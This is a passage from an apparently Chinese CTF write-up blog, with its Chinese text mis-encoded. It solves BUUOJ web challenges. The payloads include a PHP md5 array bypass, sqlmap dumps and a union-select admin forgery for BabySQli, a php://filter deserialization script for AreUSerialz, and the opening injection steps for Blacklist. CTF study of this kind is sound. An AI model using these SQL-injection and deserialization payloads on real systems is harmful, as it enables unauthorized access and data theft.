            <span class="hljs-keyword">else</span>&#123;
                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You can not get it !&#x27;</span>;
            &#125;
        &#125;
        <span class="hljs-keyword">else</span>&#123;
            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;only one way to get the flag&#x27;</span>);  <span class="hljs-comment">//passwdæ²¡èµ‹å€¼çš„æƒ…å†µ</span>
        &#125;
&#125;
    <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are not a real hacker!&quot;</span>;
    &#125;
&#125;
<span class="hljs-keyword">else</span>&#123;
    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Please input first&#x27;</span>);
&#125;
&#125;Please input first</code></pre>
<p>md5æ¯”è¾ƒï¼š</p>
<p>ä½†æ˜¯ï¼Œå¼ºæ¯”è¾ƒï¼ˆ===ï¼‰ä¸ä»…æ¯”è¾ƒå€¼ï¼Œè¿˜æ¯”è¾ƒç±»å‹ï¼Œ0eæ­¤æ—¶è¢«å½“ä½œå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨0eæ¥è¿›è¡Œç»•è¿‡ç¢°æ’ï¼Œåªèƒ½ç”¨æ•°ç»„ç»•è¿‡ï¼Œor
ï¼Œæ‰¾ä¸¤ä¸ªå€¼ä¸åŒä½†MD5ç›¸åŒçš„</p>
<pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">md5</span>(<span class="hljs-title">array</span>()) = <span class="hljs-variable"><span class="hljs-literal">null</span></span></span></code></pre>
<p>payloadï¼š</p>
<pre><code class="hljs angelscript">?gg[]=<span class="hljs-number">1</span>&amp;id[]=<span class="hljs-number">2</span>
passwd=<span class="hljs-number">1234567</span>a</code></pre>
<h2 id="gxyctf2019babysqli">[GXYCTF2019]BabySQliï¼ˆ*ï¼‰</h2>
<h4 id="è€ƒç‚¹æ‰‹å·¥è”åˆæŸ¥è¯¢ä¸å­˜åœ¨æ•°æ®æ„é€ è™šæ‹Ÿæ•°æ®ç»•è¿‡md5å¯†ç éªŒè¯">è€ƒç‚¹ï¼šæ‰‹å·¥+è”åˆæŸ¥è¯¢ä¸å­˜åœ¨æ•°æ®æ„é€ è™šæ‹Ÿæ•°æ®ç»•è¿‡md5å¯†ç éªŒè¯</h4>
<p>å…³é”®ç‚¹ï¼šå¯¹orderbyåå¹¶ä¸å›æ˜¾123è€Œæ˜¯éªŒè¯ç”¨æˆ·å/å¯†ç æ­£ç¡®ä¸å¦ï¼Œâ€”â€”ç»•è¿‡å¯†ç çš„md5éªŒè¯ï¼šéœ€è¦æŠŠæˆ‘ä»¬è¾“å…¥çš„å€¼å’Œæ•°æ®åº“é‡Œé¢å­˜æ”¾çš„ç”¨æˆ·å¯†ç çš„md5å€¼è¿›è¡Œæ¯”è¾ƒï¼Œ<strong>å¯ä»¥ç”¨è”åˆæŸ¥è¯¢è¯­å¥ç”¨æ¥ç”Ÿæˆè™šæ‹Ÿçš„è¡¨æ•°æ®è¦†ç›–åŸç”¨æˆ·adminç»•è¿‡</strong></p>
<p>ç‚¹è¿›å»æ˜¯ç™»å½•æ¡†ï¼Œç„¶ånameæœ‰æ³¨å…¥ç‚¹è€Œpwæ²¡æœ‰ï¼</p>
<p>sqlmapè·‘ï¼šå‘ç°æ˜¯å»¶æ—¶æ³¨å…¥</p>
<pre><code class="hljs apache"><span class="hljs-attribute">sqlmap</span> -u http://f<span class="hljs-number">41</span>e<span class="hljs-number">9833</span>-<span class="hljs-number">9</span>c<span class="hljs-number">93</span>-<span class="hljs-number">4</span>b<span class="hljs-number">72</span>-bb<span class="hljs-number">87</span>-<span class="hljs-number">09</span>fdedf<span class="hljs-number">1</span>b<span class="hljs-number">5</span>d<span class="hljs-number">7</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/index.php --forms</code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220309120711794.png" srcset="/img/loading.gif" alt="image-20220309120711794" style="zoom:67%;"></p>
<p>è·‘åº“å ï¼š</p>
<pre><code class="hljs apache"><span class="hljs-attribute">sqlmap</span> -u http://f<span class="hljs-number">41</span>e<span class="hljs-number">9833</span>-<span class="hljs-number">9</span>c<span class="hljs-number">93</span>-<span class="hljs-number">4</span>b<span class="hljs-number">72</span>-bb<span class="hljs-number">87</span>-<span class="hljs-number">09</span>fdedf<span class="hljs-number">1</span>b<span class="hljs-number">5</span>d<span class="hljs-number">7</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/index.php --current-db --forms
<span class="hljs-attribute">web_sqli</span></code></pre>
<p>è·‘è¡¨åï¼š</p>
<pre><code class="hljs apache"><span class="hljs-attribute">sqlmap</span> -u http://f<span class="hljs-number">41</span>e<span class="hljs-number">9833</span>-<span class="hljs-number">9</span>c<span class="hljs-number">93</span>-<span class="hljs-number">4</span>b<span class="hljs-number">72</span>-bb<span class="hljs-number">87</span>-<span class="hljs-number">09</span>fdedf<span class="hljs-number">1</span>b<span class="hljs-number">5</span>d<span class="hljs-number">7</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/index.php -D web_sqli --tables --forms
<span class="hljs-attribute">user</span></code></pre>
<p>çˆ†æ•°æ®</p>
<pre><code class="hljs apache"><span class="hljs-attribute">sqlmap</span> -u http://f<span class="hljs-number">41</span>e<span class="hljs-number">9833</span>-<span class="hljs-number">9</span>c<span class="hljs-number">93</span>-<span class="hljs-number">4</span>b<span class="hljs-number">72</span>-bb<span class="hljs-number">87</span>-<span class="hljs-number">09</span>fdedf<span class="hljs-number">1</span>b<span class="hljs-number">5</span>d<span class="hljs-number">7</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/index.php -D web_sqli -T user --dump --forms -C id
<span class="hljs-attribute">1</span>
<span class="hljs-attribute">sqlmap</span> -u http://f<span class="hljs-number">41</span>e<span class="hljs-number">9833</span>-<span class="hljs-number">9</span>c<span class="hljs-number">93</span>-<span class="hljs-number">4</span>b<span class="hljs-number">72</span>-bb<span class="hljs-number">87</span>-<span class="hljs-number">09</span>fdedf<span class="hljs-number">1</span>b<span class="hljs-number">5</span>d<span class="hljs-number">7</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/index.php -D web_sqli -T user --dump --forms -C username
<span class="hljs-attribute">admin</span>
<span class="hljs-attribute">sqlmap</span> -u http://f<span class="hljs-number">41</span>e<span class="hljs-number">9833</span>-<span class="hljs-number">9</span>c<span class="hljs-number">93</span>-<span class="hljs-number">4</span>b<span class="hljs-number">72</span>-bb<span class="hljs-number">87</span>-<span class="hljs-number">09</span>fdedf<span class="hljs-number">1</span>b<span class="hljs-number">5</span>d<span class="hljs-number">7</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/index.php -D web_sqli -T user --dump --forms -C passwd
<span class="hljs-attribute">cdc9c819c7f8be2628d4180669009d28</span></code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220309121646850.png" srcset="/img/loading.gif" alt="image-20220309121646850" style="zoom:67%;"></p>
<p>ä½†æ˜¯ç™»å½•ä¸ä¸Šå»ï¼Œå¯†ç å°è¯•md5ç ´è§£ä¹Ÿä¸è¡Œï¼Œbase32åŠ å¯†å†base64åŠ å¯†ä¹Ÿä¸è¡Œã€åç»­æ‰‹å·¥å‘ç°æ˜¯hashäº†ï¼Œä½†æ˜¯æ²¡æœ‰å‘ŠçŸ¥ç›ï¼Œæ‰€ä»¥è¿™é‡Œå¯†ç ä¸èƒ½ç ´è§£ã€‘</p>
<p>æ‰‹å·¥ï¼š</p>
<p>æäº¤æ•°æ®åè·³è½¬åˆ°search.phpï¼Œæºç çœ‹åˆ°æ³¨é‡Šæç¤ºï¼Œbase64/md5éƒ½è§£ä¸å‡ºæ¥ï¼Œä¸€é”®è§£ç å·¥å…·</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220309122020599.png" srcset="/img/loading.gif" alt="image-20220309122020599" style="zoom:80%;"></p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220309122033327.png" srcset="/img/loading.gif" alt="image-20220309122033327" style="zoom: 67%;"></p>
<p>è§£å‡ºSQLè¯­å¥</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220309122102792.png" srcset="/img/loading.gif" alt="image-20220309122102792" style="zoom:67%;"></p>
<pre><code class="hljs routeros">select * <span class="hljs-keyword">from</span><span class="hljs-built_in"> user </span>where username = <span class="hljs-string">&#x27;$name&#x27;</span></code></pre>
<p>çœ‹æ¥çœŸæ˜¯nameå­˜åœ¨æ³¨å…¥</p>
<p>orderè¢«è¿‡æ»¤ï¼šå¤§å°å†™å­—æ¯å°±èƒ½ç»•è¿‡</p>
<pre><code class="hljs routeros"><span class="hljs-attribute">name</span>=1&#x27;Order by 3#&amp;<span class="hljs-attribute">pw</span>=2  â€”â€”wrong user!
<span class="hljs-attribute">name</span>=1&#x27;Order by 4#&amp;<span class="hljs-attribute">pw</span>=2  â€”â€”Error: Unknown column <span class="hljs-string">&#x27;4&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;order clause&#x27;</span>â€”â€”3åˆ—æ•°æ®</code></pre>
<p>ç„¶å<code>name=-'union select 1,2,3#&amp;pw=2</code>å‘ç°å›æ˜¾<strong>wrong
user!</strong></p>
<p>è€Œ<code>name=-'union select 1,'admin',3#&amp;pw=2</code>å›æ˜¾wrong
pass</p>
<p><strong>é‚£ä¹ˆå°±æ˜¯å…ˆæŸ¥è¯¢ï¼ŒæŸ¥è¯¢ä¸åˆ°æ•°æ®åˆ™ â€™ worry
userâ€™,å†ç”¨æŸ¥è¯¢å‡ºæ¥çš„æ•°æ®å¯¹æ¯”passwordï¼Œå¯¹æ¯”ä¸ç¬¦åˆåˆ™ â€™ worry pass
â€™</strong></p>
<p>ä½†å½“æˆ‘ä»¬æ˜¯æµ‹è¯•adminç”¨æˆ·æ—¶å´å›æ˜¾wrong
pass!(å¯†ç é”™è¯¯)ï¼Œå¾ˆæ˜æ˜¾è¿™é‡Œç»å¯¹å­˜åœ¨adminè¿™ä¸ªè´¦å·ã€‚æ­¤æ—¶ï¼Œæˆ‘ä»¬çš„æ€è·¯å°±æ˜¯ç™»ä¸Šadminç”¨æˆ·æˆ–è€…å¾—åˆ°adminçš„å¯†ç ï¼Œä½†æ˜¯å¯†ç æ˜¯ç»è¿‡hashè¿ç®—çš„ï¼Œæ€ä¹ˆå¾—çŸ¥/è§£å¯†å‘¢ï¼Ÿ</p>
<h4 id="æ–°çŸ¥è¯†ç‚¹è™šæ‹Ÿæ•°æ®">æ–°çŸ¥è¯†ç‚¹ï¼šè™šæ‹Ÿæ•°æ®</h4>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/107167452">å‚è€ƒWP</a></p>
</blockquote>
<p>â€ƒ<strong>å½“æŸ¥è¯¢çš„æ•°æ®ä¸å­˜åœ¨çš„æ—¶å€™ï¼Œè”åˆæŸ¥è¯¢å°±ä¼šæ„é€ ä¸€ä¸ªè™šæ‹Ÿçš„æ•°æ®</strong></p>
<p>ä¸¾ä¸ªä¾‹å­ï¼šå¦‚æœusersè¡¨ä¸­åªæœ‰ä¸€è¡Œæ•°æ®ï¼Œæˆ‘ä»¬é€šè¿‡union
selectæŸ¥è¯¢å°±å¯ä»¥æ„é€ ä¸€è¡Œè™šæ‹Ÿçš„æ•°æ®ï¼Œ</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/20200706211115507.png" srcset="/img/loading.gif" style="zoom:80%;"></p>
<p><strong>é‚£ä¹ˆæˆ‘ä»¬çš„æ€è·¯å°±æ¥äº†ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è”åˆæŸ¥è¯¢æ¥åˆ›å»ºä¸€è¡Œadminè´¦æˆ·çš„ç»­é›†æ•°æ®ï¼Œæ··æ·†adminç”¨æˆ·çš„å¯†ç ï¼Œå°†æˆ‘ä»¬è‡ªå®šä¹‰çš„adminç”¨æˆ·çš„å¯†ç ï¼ˆ123ï¼‰åŠ è¿›å»ï¼Œè¿™æ ·æˆ‘ä»¬ä¸å°±å¯ä»¥ç™»å½•adminç”¨æˆ·äº†å—ã€‚</strong></p>
<p>çœ‹åˆ°æºç </p>
<pre><code class="hljs php">mysqli_query($con,<span class="hljs-string">&#x27;SET NAMES UTF8&#x27;</span>);
$name = $_POST[<span class="hljs-string">&#x27;name&#x27;</span>];
$password = $_POST[<span class="hljs-string">&#x27;pw&#x27;</span>];
$t_pw = md5($password);
$sql = <span class="hljs-string">&quot;select * from user where username = &#x27;&quot;</span>.$name.<span class="hljs-string">&quot;&#x27;&quot;</span>;
<span class="hljs-comment">// echo $sql;</span>
$result = mysqli_query($con, $sql);
<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/\(|\)|\=|or/&quot;</span>, $name))&#123;
	<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;do not hack me!&quot;</span>);
&#125;
<span class="hljs-keyword">else</span>&#123;
	<span class="hljs-keyword">if</span> (!$result) &#123;
		printf(<span class="hljs-string">&quot;Error: %s\n&quot;</span>, mysqli_error($con));
		<span class="hljs-keyword">exit</span>();
	&#125;
	<span class="hljs-keyword">else</span>&#123;
		<span class="hljs-comment">// echo &#x27;&lt;pre&gt;&#x27;;</span>
		$arr = mysqli_fetch_row($result);
		<span class="hljs-comment">// print_r($arr);</span>
		<span class="hljs-keyword">if</span>($arr[<span class="hljs-number">1</span>] == <span class="hljs-string">&quot;admin&quot;</span>)&#123;    <span class="hljs-comment">//ç¬¬äºŒåˆ—æ•°æ®è¦ç­‰äºadmin</span>
			<span class="hljs-keyword">if</span>(md5($password) == $arr[<span class="hljs-number">2</span>])&#123;   <span class="hljs-comment">//ç¬¬ä¸‰åˆ—æ•°æ®è¦ç­‰ä¸å¯†ç çš„MD5</span>
				<span class="hljs-keyword">echo</span> $flag;
			&#125;
			<span class="hljs-keyword">else</span>&#123;
				<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;wrong pass!&quot;</span>);
			&#125;
		&#125;
		<span class="hljs-keyword">else</span>&#123;
			<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;wrong user!&quot;</span>);
		&#125;
	&#125;
&#125;</code></pre>
<p>payload:</p>
<pre><code class="hljs apache"><span class="hljs-attribute">123456</span>  md<span class="hljs-number">5</span>:e<span class="hljs-number">10</span>adc<span class="hljs-number">3949</span>ba<span class="hljs-number">59</span>abbe<span class="hljs-number">56</span>e<span class="hljs-number">057</span>f<span class="hljs-number">20</span>f<span class="hljs-number">883</span>e
<span class="hljs-attribute">name</span>=&#x27;union select <span class="hljs-number">1</span>,&#x27;admin&#x27;,&#x27;e<span class="hljs-number">10</span>adc<span class="hljs-number">3949</span>ba<span class="hljs-number">59</span>abbe<span class="hljs-number">56</span>e<span class="hljs-number">057</span>f<span class="hljs-number">20</span>f<span class="hljs-number">883</span>e&#x27;#&amp;pw=<span class="hljs-number">123456</span></code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220309131226258.png" srcset="/img/loading.gif" alt="image-20220309131226258" style="zoom:67%;"></p>
<h2 id="ç½‘é¼æ¯-2020-é’é¾™ç»„areuserialz">[ç½‘é¼æ¯ 2020
é’é¾™ç»„]AreUSerialz</h2>
<h4 id="è€ƒç‚¹ååºåˆ—åŒ–æ„é€ ä¼ªåè®®ç»•è¿‡file_get_contentsç§æœ‰å±æ€§åºåˆ—åŒ–å00è¢«æ‹¦æˆª">è€ƒç‚¹ï¼šååºåˆ—åŒ–æ„é€ ã€ä¼ªåè®®ç»•è¿‡file_get_contentsã€ç§æœ‰å±æ€§åºåˆ—åŒ–å%00è¢«æ‹¦æˆª</h4>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);

highlight_file(<span class="hljs-keyword">__FILE__</span>);

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;

    <span class="hljs-keyword">protected</span> $op;
    <span class="hljs-keyword">protected</span> $filename;
    <span class="hljs-keyword">protected</span> $content;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;
        $op = <span class="hljs-string">&quot;1&quot;</span>;
        $filename = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;
        $content = <span class="hljs-string">&quot;Hello World!&quot;</span>;
        <span class="hljs-keyword">$this</span>-&gt;process();
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;
        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;
            <span class="hljs-keyword">$this</span>-&gt;write();
        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;
            $res = <span class="hljs-keyword">$this</span>-&gt;read();
            <span class="hljs-keyword">$this</span>-&gt;output($res);
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);
        &#125;
    &#125;

    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;
        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;content)) &#123;
            <span class="hljs-keyword">if</span>(strlen((<span class="hljs-keyword">string</span>)<span class="hljs-keyword">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;
                <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Too long!&quot;</span>);
                <span class="hljs-keyword">die</span>();
            &#125;
            $res = file_put_contents(<span class="hljs-keyword">$this</span>-&gt;filename, <span class="hljs-keyword">$this</span>-&gt;content);
            <span class="hljs-keyword">if</span>($res) <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Successful!&quot;</span>);
            <span class="hljs-keyword">else</span> <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Failed!&quot;</span>);
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Failed!&quot;</span>);
        &#125;
    &#125;
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;
        $res = <span class="hljs-string">&quot;&quot;</span>;
        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;filename)) &#123;
            $res = file_get_contents(<span class="hljs-keyword">$this</span>-&gt;filename);
        &#125;
        <span class="hljs-keyword">return</span> $res;
    &#125;
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params">$s</span>) </span>&#123;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;
        <span class="hljs-keyword">echo</span> $s;
    &#125;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-comment">//4ï¼Œè¦è·³è¿‡å†™ï¼Œç›´æ¥è¯»ï¼šopå¿…é¡»ä¸æ»¡è¶³===2ï¼Œä¸”æ»¡è¶³==2</span>
        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>) 
            <span class="hljs-keyword">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;  
        <span class="hljs-keyword">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;
        <span class="hljs-keyword">$this</span>-&gt;process();
    &#125;

&#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params">$s</span>) </span>&#123;    <span class="hljs-comment">//  2</span>
    <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; strlen($s); $i++)
        <span class="hljs-keyword">if</span>(!(ord($s[$i]) &gt;= <span class="hljs-number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="hljs-number">125</span>))   <span class="hljs-comment">//ordè¿”å›ASCIIï¼Œ21-125ï¼šå¯è§å­—ç¬¦</span>
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
&#125;

<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;

    $str = (<span class="hljs-keyword">string</span>)$_GET[<span class="hljs-string">&#x27;str&#x27;</span>];  <span class="hljs-comment">//1</span>
    <span class="hljs-keyword">if</span>(is_valid($str)) &#123; 
        $obj = unserialize($str);  <span class="hljs-comment">//3</span>
    &#125;

&#125;</code></pre>
<p>æ•´ä¸ªæµç¨‹ï¼šGETä¼ å‚åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œæ»¡è¶³ASCIIæœ‰æ•ˆåæ‰§è¡Œdestructå‡½æ•°ï¼Œå±æ€§opä¸æ»¡è¶³<code>===2</code>ï¼Œæ»¡è¶³<code>==2</code>ï¼Œå°±ä¼šæ‰§è¡Œreadå‡½æ•°ï¼Œfile_get_contentsè¯»å–æ–‡ä»¶å¹¶è¿”å›ç»“æœ</p>
<ol type="1">
<li>ä¸€å¼€å§‹æ²¡æƒ³åˆ°file_get_contentsï¼Œç›´æ¥è¯»äº†flag.phpï¼Œå‘ç°ä¸å¯¹ï¼Œæ‰ååº”è¿‡æ¥<strong>æœ‰file_get_contents</strong>==ã€‹åˆ©ç”¨ä¼ªåè®®php://filterï¼Œè¯»æºç </li>
<li>åŒæ—¶è¿˜è¦æ³¨æ„ï¼š==privateå±æ€§åºåˆ—åŒ–çš„æ—¶å€™æ ¼å¼æ˜¯
%00ç±»å%00æˆå‘˜åï¼Œè‡ªå†™è„šæœ¬ç›´æ¥ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸²åè¿˜è¦æ‰‹åŠ¨åŠ ä¸Š%00==</li>
</ol>
<p>æ„é€ è„šæœ¬ï¼š</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;
    <span class="hljs-keyword">protected</span> $op=<span class="hljs-number">2</span>;
    <span class="hljs-keyword">protected</span> $filename=<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>;
    <span class="hljs-keyword">protected</span> $content;
&#125;
$flag = <span class="hljs-keyword">new</span> FileHandler();
$flag_1 = serialize($flag);
<span class="hljs-keyword">echo</span> $flag_1;</code></pre>
<pre><code class="hljs less">å†æ‰‹åŠ¨åŠ ä¸Š%<span class="hljs-selector-tag">00</span>
<span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:11</span><span class="hljs-selector-pseudo">:&quot;FileHandler&quot;</span><span class="hljs-selector-pseudo">:3</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;%00*%00op&quot;</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">2</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;%00*%00filename&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">52</span>:<span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;%00*%00content&quot;</span>;<span class="hljs-selector-tag">N</span>;&#125;</code></pre>
<ol start="3" type="1">
<li><p>ç„¶åå‘ç°åˆä¸å¯¹ï¼Œ<strong>å› ä¸ºç©ºå­—ç¬¦çš„ASCIIæ˜¯0ï¼Œä¸æ»¡è¶³ä¸€å¼€å§‹çš„ASCIIæœ‰æ•ˆæ£€éªŒ</strong>ï¼Œå°±ä¸ä¼šå¾€åæ‰§è¡Œï¼Œååºåˆ—åŒ–</p>
<pre><code class="hljs aspectj"><span class="hljs-function">echo <span class="hljs-title">ord</span><span class="hljs-params">(<span class="hljs-string">&#x27;&#x27;</span>)</span></span>;   <span class="hljs-comment">//0</span></code></pre></li>
</ol>
<h4 id="å¦‚ä½•ç»•è¿‡å‘¢00">å¦‚ä½•ç»•è¿‡å‘¢%00ï¼Ÿ</h4>
<ul>
<li><strong>ç®€å•çš„ä¸€ç§æ˜¯ï¼šphp7.1+ç‰ˆæœ¬å¯¹å±æ€§ç±»å‹ä¸æ•æ„Ÿï¼Œä½¿ç”¨ public
ä¿®é¥°æˆå‘˜å¹¶åºåˆ—åŒ–ï¼Œååºåˆ—åŒ–åè¿˜æ˜¯publicâ€”â€”æœ¬åœ°åºåˆ—åŒ–çš„æ—¶å€™å°†å±æ€§æ”¹ä¸ºpublicè¿›è¡Œç»•è¿‡å³å¯</strong></li>
</ul>
<p>æ„é€ è„šæœ¬ï¼š</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;

    <span class="hljs-keyword">public</span> $op=<span class="hljs-number">2</span>;
    <span class="hljs-keyword">public</span> $filename=<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>;
    <span class="hljs-keyword">public</span> $content;
&#125;
$flag = <span class="hljs-keyword">new</span> FileHandler();
$flag_1 = serialize($flag);
<span class="hljs-keyword">echo</span> $flag_1;</code></pre>
<pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;FileHandler&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;op&quot;</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;filename&quot;</span>;s:<span class="hljs-number">52</span>:<span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;content&quot;</span>;N;&#125;</code></pre>
<p><span style="background:#FF9999;">æ³¨æ„</span>ï¼šä¸€å¼€å§‹æˆ‘ç”¨çš„op="2a"ï¼Œå‘ç°ä¸è¡Œï¼Œå› ä¸ºè¦<code>ä¸æ»¡è¶³===ä¸”æ»¡è¶³=="2"</code>ï¼Œè¿™é‡Œæ»¡è¶³çš„æ˜¯<strong>å¼±ç­‰äºå­—ç¬¦ä¸²2ï¼Œè€Œä¸æ˜¯æ•°å­—2</strong></p>
<pre><code class="hljs ini"><span class="hljs-attr">&quot;2a&quot;</span>  ==  <span class="hljs-string">&quot;2&quot;</span>  x
<span class="hljs-attr">&quot;2a&quot;</span>  ==   <span class="hljs-number">2</span>   âˆš
<span class="hljs-attr">&quot;2&quot;</span>   ==   <span class="hljs-number">2</span>   âˆš</code></pre>
<p>ç„¶åæˆåŠŸè¯»åˆ°flag.phpçš„base64æºç ï¼Œè§£ç å¾—åˆ°flag</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220312203106671.png" srcset="/img/loading.gif" alt="image-20220312203106671"></p>
<h2 id="gyctf2020blacklist">[GYCTF2020]Blacklist</h2>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zzjdbk/p/13681752.html">å‚è€ƒwp</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7169#toc-47">ä¸€äº›è¿‡æ»¤æŠ€å·§æ€»ç»“</a></p>
</blockquote>
<h4 id="è€ƒç‚¹å †å æ³¨å…¥ç±»ä¼¼å¼ºç½‘æ¯handlerä»£æ›¿selectæŸ¥è¯¢">è€ƒç‚¹ï¼šå †å æ³¨å…¥ï¼Œç±»ä¼¼å¼ºç½‘æ¯ã€handlerä»£æ›¿selectæŸ¥è¯¢</h4>
<p>ä¸‡èƒ½å¯†ç ï¼Œçˆ†å‡º3ä¸ªå†…å®¹</p>
<pre><code class="hljs lsl"><span class="hljs-number">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span>#</code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220312212345118.png" srcset="/img/loading.gif" alt="image-20220312212345118" style="zoom:50%;"></p>
<p>æŸ¥å‡ºæ¥ä¸¤ä¸ªå­—æ®µ</p>
<pre><code class="hljs crmsh">?<span class="hljs-attr">inject=</span><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">2</span>--+</code></pre>
<p>é»‘åå•ï¼š</p>
